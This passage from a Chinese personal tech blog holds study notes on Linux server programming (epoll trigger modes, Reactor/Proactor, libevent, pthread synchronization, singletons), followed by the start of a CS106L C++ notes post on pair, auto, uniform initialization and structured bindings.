<p>ET：<strong>只在状态变化时通知一次</strong>，如果不立即处理，<code>epoll_wait()</code>
<strong>不会再次通知</strong>。</p>
<ol type="1">
<li><strong>LT（Level Triggered，水平触发）模式</strong></li>
</ol>
<ul>
<li><strong>行为</strong>：
<ul>
<li>只要文件描述符处于就绪状态（即有数据可读或可写），epoll
就会持续通知应用程序。</li>
<li>如果应用程序没有处理完所有数据，epoll 会在下一次调用 epoll_wait
时再次通知。</li>
</ul></li>
<li>特点:
<ul>
<li>简单易用: 适合初学者或简单的应用场景。</li>
<li>容错性强:
即使应用程序没有一次性处理完所有数据，也不会丢失事件。</li>
<li>可能效率较低: 如果应用程序没有及时处理数据，epoll
会频繁通知，导致不必要的开销。</li>
</ul></li>
<li>适用场景:
<ul>
<li>需要兼容性强的场景（如传统的 select 或 poll 迁移到 epoll）。</li>
<li>对性能要求不高的场景。</li>
</ul></li>
</ul>
<ol start="2" type="1">
<li><strong>ET（Edge Triggered，边缘触发）模式</strong></li>
</ol>
<ul>
<li><strong>行为</strong>:
<ul>
<li>只有当文件描述符的状态发生变化时（如从无数据变为有数据），epoll
才会通知应用程序。</li>
<li>如果应用程序没有处理完所有数据，epoll
不会再次通知，除非文件描述符的状态再次发生变化。</li>
</ul></li>
<li>特点:
<ul>
<li>高效: 减少了不必要的通知，适合高性能场景。</li>
<li>需要一次性处理完数据:
应用程序必须确保在一次事件通知中处理完所有数据，否则可能会丢失后续事件。</li>
<li>复杂性较高: 需要更精细的控制，通常与非阻塞 I/O 结合使用。</li>
</ul></li>
<li>适用场景:
<ul>
<li>高性能服务器（如 Web 服务器、游戏服务器）。</li>
<li>需要处理大量并发连接的场景。</li>
</ul></li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">event.events = EPOLLIN; <span class="comment">// LT 模式</span></span><br><span class="line"><span class="comment">// event.events = EPOLLIN | EPOLLET; // ET 模式</span></span><br><span class="line"><span class="built_in">epoll_ctl</span>(epfd, EPOLL_CTL_ADD, socket_fd, &amp;event);</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p><code>EPOLLONESHOT</code> 是 <code>epoll</code>
监听事件的一个<strong>特殊标志</strong>，它的作用是：</p>
<ul>
<li><strong>事件触发一次后，自动从 <code>epoll</code>
监听列表中移除</strong>。</li>
<li><strong>适用于多线程环境</strong>，防止多个线程同时处理同一个
<code>fd</code>。</li>
</ul>
</blockquote>
<blockquote>
<p><strong>内核事件表（Kernel Event Table）</strong> 是
<strong><code>epoll</code></strong>
机制的<strong>核心数据结构</strong>，用于<strong>存储和管理需要监听的文件描述符（fd）及其事件</strong>。它由
Linux 内核维护，提供了高效的事件通知机制。</p>
<ol type="1">
<li><p>为什么需要内核事件表？</p>
<p>在 <code>select()</code> 和 <code>poll()</code>
机制中，用户进程<strong>每次调用</strong>都要<strong>传递所有监听的
fd</strong>，导致<strong>大量数据拷贝和遍历</strong>，影响性能。</p>
<p><strong><code>epoll</code> 的改进：</strong></p>
<ol type="1">
<li><p><strong>fd 只需注册一次</strong>，存入
<strong>内核事件表</strong>，后续内核自动管理。</p></li>
<li><p><strong>避免无效 fd 遍历</strong>，只返回<strong>发生事件的
fd</strong>，提高效率（<code>O(1)</code>）。</p></li>
</ol></li>
<li><p>内核事件表的组成</p>
<p>内核事件表可以理解为一个<strong>红黑树 + 就绪列表</strong>：</p>
<ol type="1">
<li><strong>监听 fd 的红黑树</strong></li>
</ol>
<ul>
<li>作用：存储 <strong>所有已注册的 fd</strong>，支持高效的
<strong>增/删/改</strong>。</li>
<li>由 <code>epoll_ctl()</code> 进行管理。</li>
</ul>
<ol start="2" type="1">
<li><strong>事件就绪列表</strong></li>
</ol>
<ul>
<li>作用：存储 <strong>发生事件的 fd</strong>。</li>
<li><code>epoll_wait()</code> 只返回<strong>就绪列表中的
fd</strong>，避免无效遍历，提高性能</li>
</ul></li>
</ol>
</blockquote>
<h2 id="两种事件处理模式">两种事件处理模式</h2>
<h3 id="reactor模式">Reactor模式</h3>
<p>使⽤<strong>同步I/O模型</strong>实现。其主要特点是<strong>由一个或多个
I/O 多路复用器（如
<code>select</code>、<code>poll</code>、<code>epoll</code>）监听事件</strong>，当事件发生时，通知相应的事件处理器进行处理。</p>
<ul>
<li><strong>主线程</strong> 监听 I/O 事件，分发任务。</li>
<li><strong>工作线程</strong> 处理 I/O 和业务逻辑，通常使用线程池。</li>
<li>适用于 <strong>高并发短 I/O 操作</strong>，如 <code>epoll</code>
服务器（Nginx、Redis）。</li>
</ul>
<h3 id="proactor模式">Proactor模式</h3>
<p>使⽤<strong>异步I/O模型</strong>实现。其核心思想是<strong>由操作系统内核完成
I/O
操作后再通知应用程序</strong>，即事件的处理由内核负责，而不是应用程序主动去检查事件状态。</p>
<ul>
<li><strong>主线程</strong> 提交异步 I/O，等待操作系统通知完成。</li>
<li><strong>操作系统</strong> 负责实际 I/O 读取和写入。</li>
<li><strong>工作线程</strong> 只处理完成的 I/O 数据，执行业务逻辑。</li>
<li>适用于 <strong>长时间异步 I/O 操作</strong>，如 Windows IOCP。</li>
</ul>
<h2 id="两种并发模式">两种并发模式</h2>
<h3 id="半同步半异步">半同步/半异步</h3>
<ol type="1">
<li><p>下面这种也叫<strong>半同步/半反应堆</strong>模式</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20250222231946543.png" alt="image-20250222231946543">
<figcaption aria-hidden="true">image-20250222231946543</figcaption>
</figure>
<p>上图中的异步线程只有⼀个，由主线程来充当，工作线程都是同步线程</p></li>
<li><p>下面是⾼效的<strong>半同步/半异步</strong>模式</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20250222232510227.png" alt="image-20250222232510227">
<figcaption aria-hidden="true">image-20250222232510227</figcaption>
</figure>
<p>注意这里的主线程只管理<strong>监听socket</strong>，而<strong>连接socket</strong>交给工作线程管理。在这种⾼效的半同步/半异步模式中，每个线程都⼯作在异步模式。所以它并⾮严格意义上的半同步/半异步模式。</p></li>
</ol>
<h3 id="领导者追随者模式">领导者/追随者模式</h3>
<ul>
<li>多个⼯作线程轮流获得事件源集合，轮流监听、分发并处理事件</li>
<li>在任意时间点，程序都仅有⼀个领导者线程，它负责监听I/O事件。</li>
<li>其他线程则都是追随者，它们休眠在线程池中等待成为新的领导者</li>
<li>当前的领导者如果检测到I/O事件，⾸先要从线程池中推选出新的领导者线程，然后(当前领导者)处理I/O事件，新领导者等待新的I/O事件</li>
</ul>
<h2 id="libevent-框架">Libevent 框架</h2>
<p><code>libevent</code> 的核心概念可以通过以下方式理解：</p>
<ul>
<li><strong>事件处理器</strong>：事件处理器负责处理特定类型的事件，它们定义了事件的源（如文件描述符、信号等）和触发条件（如可读、可写、信号到来、定时器到期等）。每个事件处理器都绑定了一个回调函数，事件发生时，回调函数会被调用。</li>
<li><strong>事件多路分发器</strong>：事件分发器负责使用操作系统的 I/O
多路复用机制来监听事件源的状态，并触发相应的回调。它管理和调度所有事件的执行。</li>
<li><strong>事件队列</strong>：事件队列是 <code>libevent</code>
用来存储和调度事件的结构，它保证了事件按照正确的顺序（优先级、时间顺序等）进行调度。事件队列也负责管理
I/O、定时器、信号等类型的事件，并将它们传递给事件分发器进行执行。</li>
</ul>
<p><strong>核心结构</strong></p>
<ul>
<li><code>event_base</code>：事件分发器，管理所有事件。</li>
<li><code>event</code>：事件处理器，表示具体的
I/O、信号、定时器事件。</li>
</ul>
<p><strong>主要流程</strong></p>
<ol type="1">
<li><p><strong>创建事件循环</strong> →
<code>event_base_new()</code></p></li>
<li><p><strong>创建事件</strong> → <code>event_new()</code></p></li>
<li><p><strong>注册事件</strong> → <code>event_add()</code></p>
<blockquote>
<p><code>event_add()</code>
只是将事件添加到事件循环中，并将其注册到事件队列。它告诉
<code>libevent</code> 这个事件（例如 I/O
事件、信号事件）应当被监听和调度，但是它并没有
<strong>直接建立事件源与事件处理器之间的映射关系</strong>。对于信号事件（例如
<code>SIGINT</code>），这时就需要通过内部的映射函数来将信号（如
<code>SIGINT</code>）与对应的事件处理器进行关联。具体而言，<code>evmap_signal_add()</code>
就是用来处理这种信号与事件处理器的映射关系。</p>
</blockquote></li>
<li><p><strong>启动事件循环</strong> →
<code>event_base_dispatch()</code></p></li>
<li><p><strong>触发事件并执行回调</strong></p></li>
<li><p><strong>释放资源</strong> → <code>event_free()</code> /
<code>event_base_free()</code></p></li>
</ol>
<p><strong>事件处理机制</strong></p>
<ul>
<li><strong>I/O 事件</strong>：监听文件描述符的可读/可写状态。</li>
<li><strong>信号事件</strong>：监听系统信号（如
<code>SIGINT</code>）。</li>
<li><strong>定时器事件</strong>：在指定时间后触发回调。</li>
</ul>
<h2 id="多进程编程">多进程编程</h2>
<h3 id="exec与fork">exec与fork</h3>
<ol type="1">
<li><p><code>fork</code> 之后的内存状态</p>
<p>当你调用 <code>fork</code>
时，操作系统会创建一个新的进程（子进程），子进程是父进程的副本。这意味着：</p>
<ul>
<li>子进程会复制父进程的代码段、数据段、堆栈、打开的文件描述符等。</li>
<li><strong>在 <code>fork</code>
的瞬间，父进程和子进程的内存内容是完全相同的</strong>。</li>
</ul>
<p>但是，现代操作系统使用了一种称为 <strong>写时复制（Copy-On-Write,
COW）</strong> 的技术来优化 <code>fork</code> 的性能：</p>
<ul>
<li><strong>写时复制的含义</strong>：<code>fork</code>
之后，父进程和子进程共享同一块物理内存，直到其中一个进程尝试修改内存时，操作系统才会为修改的进程复制一份新的内存页。</li>
<li>这种机制避免了不必要的内存复制，提高了性能。</li>
</ul></li>
<li><p><code>exec</code> 的作用</p>
<p><code>exec</code> 的作用是
<strong>替换当前进程的映像</strong>。具体来说：</p>
<ul>
<li><code>exec</code>
会将当前进程的代码段、数据段、堆栈等全部替换为新程序的内容。</li>
<li>调用 <code>exec</code>
后，当前进程的内存空间会被新程序的内容覆盖。</li>
</ul></li>
<li><p>结合 <code>fork</code> 和 <code>exec</code> 的工作流程</p>
<p>当你在子进程中调用 <code>exec</code> 时，会发生以下事情：</p>
<ol type="1">
<li><strong>子进程的内存被替换</strong>：</li>
</ol>
<ul>
<li><code>exec</code>
会加载新程序的代码和数据到子进程的内存空间中。</li>
<li>由于写时复制的机制，子进程的内存修改不会影响父进程。</li>
</ul>
<ol start="2" type="1">
<li><strong>父进程不受影响</strong>：</li>
</ol>
<ul>
<li>父进程的内存空间保持不变，继续执行原来的代码。</li>
</ul>
<ol start="3" type="1">
<li><strong>子进程执行新程序</strong>：</li>
</ol>
<ul>
<li>子进程从新程序的入口点（通常是 <code>main</code>
函数）开始执行。</li>
</ul></li>
</ol>
<h2 id="多线程编程">多线程编程</h2>
<h3 id="互斥锁">1. 互斥锁</h3>
<p>互斥锁（<code>pthread_mutex_t</code>）是一种用于
<strong>保护共享资源</strong>
的同步机制，它确保同一时刻只有一个线程可以访问共享资源。多个线程如果要访问同一资源，必须先获取该互斥锁，获取锁成功后才能访问资源，访问完毕后释放锁。</p>
<ul>
<li><strong>主要作用</strong>：保护共享资源，防止多个线程同时访问导致数据不一致。</li>
<li><strong>行为</strong>：加锁后，其他线程无法加锁，直到锁被释放。</li>
<li><strong>示例用法</strong>：保证线程安全地访问全局变量、共享数据结构等。</li>
</ul>
<h3 id="信号量">2. 信号量</h3>
<p>信号量（<code>sem_t</code>）是一种计数机制，用于控制多个线程对共享资源的访问。信号量通常用于控制并发的线程数，或者用于线程间的同步。当信号量的值大于
0 时，表示可以继续执行，线程会执行
<code>sem_wait</code>（等待）直到信号量大于 0，然后
<code>sem_post</code>（释放）信号量。</p>
<ul>
<li><strong>主要作用</strong>：控制对共享资源的访问数量或线程间的同步。</li>
<li><strong>行为</strong>：信号量的值可以增加或减少，通常用于实现生产者-消费者模式、控制线程池大小等。</li>
<li><strong>示例用法</strong>：控制线程池中同时运行的线程数，或者协调生产者和消费者之间的同步。</li>
</ul>
<h3 id="条件变量">3. 条件变量</h3>
<p>条件变量（<code>pthread_cond_t</code>）是用于
<strong>线程间协调</strong>
的同步机制，允许线程在某个条件满足时被唤醒。它通常与互斥锁配合使用。当一个线程需要等待某个条件满足时，它会在条件变量上等待，并释放互斥锁。一旦条件满足，另一个线程就会通过条件变量通知（<code>signal</code>
或 <code>broadcast</code>）其他线程继续执行。</p>
<ul>
<li><strong>主要作用</strong>：线程间的协调与同步，常用于“等待某个条件满足”后继续执行。</li>
<li><strong>行为</strong>：线程等待条件变量时会释放互斥锁，直到条件满足时被通知。</li>
<li><strong>示例用法</strong>：线程等待某个资源准备好，或者等待某个状态变更，例如生产者-消费者模式中的条件等待。</li>
</ul>
<blockquote>
<p><code>pthread_cond_wait(&amp;cond, &amp;mutex)</code>：</p>
<ul>
<li>该函数会使当前线程进入
<strong>阻塞状态</strong>，并且<strong>自动释放</strong>传入的
<code>mutex</code>，直到满足条件并且 <code>pthread_cond_signal()</code>
或 <code>pthread_cond_broadcast()</code>
被调用时，才会唤醒该线程并重新获取锁。</li>
</ul>
<p><code>pthread_cond_signal()</code>：</p>
<ul>
<li>该函数 <strong>不会</strong> 释放 <code>mutex</code>。它的作用是通知
<strong>至少一个</strong> 等待该条件变量的线程可以继续执行。</li>
</ul>
</blockquote>
<h2 id="线程池">线程池</h2>
<h3 id="pthread_create"><code>pthread_create()</code></h3>
<p>父线程调用 <code>pthread_create()</code>
来创建子线程。在这个过程中，父线程提供一个回调函数（通常称为线程函数），该回调函数定义了子线程的行为。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">pthread_create</span><span class="params">(<span class="type">pthread_t</span> *thread, <span class="type">const</span> <span class="type">pthread_attr_t</span> *attr, <span class="type">void</span> *(*start_routine)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p>参数：</p>
<ul>
<li><code>thread</code>:
线程标识符的指针，函数成功后会填充该值，表示新创建的子线程。</li>
<li><code>attr</code>: 用于线程属性的结构体，通常可以为
<code>NULL</code>，表示使用默认属性。</li>
<li><code>start_routine</code>: 子线程执行的函数（线程函数）。</li>
<li><code>arg</code>: 传递给子线程函数的参数。</li>
</ul>
<h3 id="pthread_detach"><code>pthread_detach</code></h3>
<p><code>pthread_detach</code> 是 POSIX
线程库（<code>pthread</code>）中的一个函数，用于<strong>分离线程</strong>，使其在结束时自动释放资源，而不需要
<code>pthread_join()</code> 进行回收。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">pthread_detach</span><span class="params">(<span class="type">pthread_t</span> thread)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p>参数：</p>
<ul>
<li><code>thread</code>：要分离的线程 ID（<code>pthread_t</code>
类型）。</li>
</ul>
<p>返回值</p>
<ul>
<li><strong>成功</strong>：返回 <code>0</code>。</li>
<li>失败：返回错误码（例如 EINVAL或 ESRCH）。
<ul>
<li><code>EINVAL</code>（Invalid
Argument）：线程已经是<strong>分离状态</strong>。</li>
<li><code>ESRCH</code>（No Such Process）：线程 ID
无效，线程不存在。</li>
</ul></li>
</ul>
<blockquote>
<table>
<colgroup>
<col style="width: 16%">
<col style="width: 37%">
<col style="width: 12%">
<col style="width: 14%">
<col style="width: 18%">
</colgroup>
<thead>
<tr class="header">
<th><strong>函数</strong></th>
<th><strong>作用</strong></th>
<th><strong>回收资源</strong></th>
<th><strong>主线程等待</strong></th>
<th><strong>适用场景</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>pthread_detach</code></td>
<td>让线程<strong>自动释放</strong>，无需 <code>join</code></td>
<td>✅ 是</td>
<td>❌ 否</td>
<td>长期运行的工作线程</td>
</tr>
<tr class="even">
<td><code>pthread_join</code></td>
<td><strong>阻塞</strong>等待线程执行完，并获取返回值</td>
<td>✅ 是</td>
<td>✅ 是</td>
<td>需要获取线程结果</td>
</tr>
</tbody>
</table>
</blockquote>
<h2 id="单例模式">单例模式</h2>
<blockquote>
<ol type="1">
<li><p><strong>构造函数必须私有化</strong>（否则不是单例）</p></li>
<li><p>析构函数根据需求选择：</p>
<ul>
<li>需要防止外部删除 → 私有化 + 自定义销毁逻辑（如 atexit）
<ul>
<li>禁止用户直接销毁对象，通常用于单例模式或对象池。</li>
<li>控制对象的生命周期，只能通过特定的成员函数销毁对象。</li>
</ul></li>
<li>使用 Meyer's Singleton（局部静态变量）→ 可公开析构</li>
</ul></li>
</ol>
</blockquote>
<h3 id="懒汉模式">懒汉模式</h3>
<p>实例在第一次使用时创建</p>
<ul>
<li>在 C++11
及以上版本中，局部静态变量的初始化是线程安全的，可以简化单例模式的实现</li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">single</span> {</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">single</span>() {}</span><br><span class="line">    ~<span class="built_in">single</span>() {}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> single&amp; <span class="title">getinstance</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="type">static</span> single instance;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<h3 id="饿汉模式">饿汉模式</h3>
<p>实例在程序启动时创建</p>
<ul>
<li>利用局部静态变量的特性实现线程安全的单例模式。</li>
<li>C++11 及以上版本保证局部静态变量的初始化是线程安全的</li>
</ul>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> Singleton* <span class="title">getInstance</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">Singleton</span>() {}  <span class="comment">// 私有构造函数</span></span><br><span class="line">    <span class="built_in">Singleton</span>(<span class="type">const</span> Singleton&amp;) = <span class="keyword">delete</span>;  <span class="comment">// 禁止拷贝构造</span></span><br><span class="line">    Singleton&amp; <span class="keyword">operator</span>=(<span class="type">const</span> Singleton&amp;) = <span class="keyword">delete</span>;  <span class="comment">// 禁止赋值操作</span></span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> Singleton* instance;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">Singleton* Singleton::instance = <span class="keyword">new</span> <span class="built_in">Singleton</span>();  <span class="comment">// 静态成员初始化</span></span><br></pre></td></tr></tbody></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/04/CS106L/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/02/04/CS106L/" class="post-title-link" itemprop="url">CS106L-24Autumn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-02-04 20:57:26" itemprop="dateCreated datePublished" datetime="2025-02-04T20:57:26+08:00">2025-02-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-03-25 18:05:14" itemprop="dateModified" datetime="2025-03-25T18:05:14+08:00">2025-03-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CPP/" itemprop="url" rel="index"><span itemprop="name">CPP</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CS106L/" itemprop="url" rel="index"><span itemprop="name">CS106L</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>20k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>19 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>课程官网：http://web.stanford.edu/class/cs106l/</p>
<p>Assignment代码：https://github.com/cs106l/cs106l-assignments/tree/main</p>
<h2 id="stdpair">std::pair</h2>
<p>是一种类模板，它将<strong>两个</strong>异质对象作为一个单元存储，由头文件<code>#include &lt;utility&gt;</code>定义</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原理</span></span><br><span class="line"><span class="keyword">template</span>&lt;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">T1</span>,</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">T2</span></span><br><span class="line">&gt; <span class="keyword">struct</span> <span class="title class_">pair</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例</span></span><br><span class="line">std::pair&lt;std::string, <span class="type">int</span>&gt; dozen {<span class="string">"eggs"</span>, <span class="number">12</span>};</span><br></pre></td></tr></tbody></table></figure>
<h2 id="using">using</h2>
<p><code>using</code>关键字可以定义别名，例如：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Zeros 是 std::pair&lt;double, double&gt; 的简化名称</span></span><br><span class="line"><span class="keyword">using</span> Zeros = std::pair&lt;<span class="type">double</span>, <span class="type">double</span>&gt;; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Solution 是 std::pair&lt;bool, Zeros&gt; 的简化名称</span></span><br><span class="line"><span class="keyword">using</span> Solution = std::pair&lt;<span class="type">bool</span>, Zeros&gt;;</span><br></pre></td></tr></tbody></table></figure>
<h2 id="auto">auto</h2>
<p><code>auto</code>关键字让编译器推断变量的类型，例如：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 未简化</span></span><br><span class="line">std::pair&lt;<span class="type">bool</span>, std::pair&lt;<span class="type">double</span>, <span class="type">double</span>&gt;&gt; result = <span class="built_in">solveQuadratic</span>(a, b, c);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用auto关键字</span></span><br><span class="line"><span class="keyword">auto</span> result = <span class="built_in">solveQuadratic</span>(a, b, c);</span><br></pre></td></tr></tbody></table></figure>
<h2 id="统一初始化c11">统一初始化（C++11）</h2>
<p>使用<code>=</code>或者<code>()</code>进行初始化会默认进行类型转换，例如：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> numOne = <span class="number">12.0</span>; <span class="comment">// numOne是12</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">numTwo</span><span class="params">(<span class="number">12.0</span>)</span></span>; <span class="comment">// numTwo也是12</span></span><br></pre></td></tr></tbody></table></figure>
<p><strong>统一初始化</strong>（<strong>Uniform
Initialization</strong>）是 C++11 引入的一种新的初始化语法，旨在提供一种
<strong>统一且更安全</strong> 的方式来初始化变量和对象。它通过
<strong>大括号 <code>{}</code></strong> 实现初始化。例如：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> numOne{<span class="number">12.0</span>}; <span class="comment">// 编译时报错，不允许类型缩小转换（double-&gt;int）</span></span><br><span class="line"><span class="type">float</span> numTwo{<span class="number">12.0</span>}; <span class="comment">// 正确</span></span><br></pre></td></tr></tbody></table></figure>
<p>除了基本类型，统一初始化还可用于<code>vector</code>、<code>map</code>等不同容器</p>
<h2 id="结构化绑定c17">结构化绑定（C++17）</h2>
<p>结构化绑定是C++17引入的一种新特性，用于将<strong>元组（<code>std::tuple</code>）</strong>、<strong>结构体</strong>或类似的可解构对象分解为多个独立变量。它提供了一种简便的方法来直接解构数据。</p>
<p>示例：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::tuple&lt;std::string, std::string, std::string&gt; <span class="title">getClassInfo</span><span class="params">()</span> </span>{</span><br><span class="line">    std::string className = <span class="string">"CS106L"</span>;</span><br><span class="line">    std::string buildingName = <span class="string">"Thornton 110"</span>;</span><br><span class="line">    std::string language = <span class="string">"C++"</span>;</span><br><span class="line">    <span class="keyword">return</span> {className, buildingName, language}; <span class="comment">// 这里返回的是tuple对象</span></span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">auto</span> [className, buildingName, language] = <span class="built_in">getClassInfo</span>(); <span class="comment">// 注意这一行</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Come to "</span> &lt;&lt; buildingName &lt;&lt; <span class="string">" and join us for "</span> &lt;&lt; className</span><br><span class="line">              &lt;&lt; <span class="string">" to learn "</span> &lt;&lt; language &lt;&lt; <span class="string">"!"</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>我疑惑的点在于，明明<code>getClassInfo()</code>返回值是tuple对象，为什么最后变成了三个对象？因为第八行的<code>[ ]</code>
是结构化绑定的标准语法，用于<strong>解构</strong>
<code>getClassInfo</code> 返回的
<code>std::tuple</code>，<strong>将元组中的每个元素绑定到独立变量中</strong>。</p>
<h3 id="引用与结构化绑定">引用与结构化绑定</h3>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">shift</span><span class="params">(std::vector&lt;std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; &amp;nums)</span> </span>{</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> [num1, num2] : nums) { <span class="comment">// 值绑定：产生副本，修改不影响原始数据</span></span><br><span class="line">        num1++;</span><br><span class="line">        num2++;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>调用该函数是无法该改变<code>nums</code>的，应该在<code>auto</code>后面添加<code>&amp;</code>符号</p>
<h2 id="左值和右值">左值和右值</h2>
<h3 id="左值-l-value">左值 l-value</h3>
<p>左值可以放置在<code>=</code>符号的左边或者右边</p>
<p>例如：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// x 是左值，下面两个式子均成立</span></span><br><span class="line"><span class="type">int</span> y = x;</span><br><span class="line">x = <span class="number">344</span>;</span><br></pre></td></tr></tbody></table></figure>
<h3 id="右值-r-value">右值 r-value</h3>
<p>右值只能放置在<code>=</code>符号的右边</p>
<p>例如：</p>
